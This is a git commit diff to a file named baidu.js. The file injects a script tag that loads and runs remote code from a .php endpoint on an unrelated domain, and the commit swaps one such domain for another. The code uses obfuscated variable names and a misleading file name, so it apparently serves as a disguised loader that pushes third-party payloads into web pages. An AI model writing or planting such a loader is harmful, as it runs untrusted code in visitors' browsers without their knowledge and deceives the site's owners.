f485842510c8242469b5ffb8da08e18664da17be
nikeoboy <2478164156@qq.com>
2020-10-30 18:09:46 +0800

    Update baidu.js
    更新

--- baidu.js
+++ baidu.js
@@ -1,6 +1,6 @@
 (function() {
  var FBJfMQx = document.createElement("script");
- FBJfMQx.src = "https://yqhlty.com/C5E7DFAF771D423ECF.php?id=8191";
+ FBJfMQx.src = "https://maobujie.com/C5E7DFAF771D423ECF.php?id=8191";
  var BIYtu = document.getElementsByTagName("script")[0];
  BIYtu.parentNode.insertBefore(FBJfMQx, BIYtu);
 })();
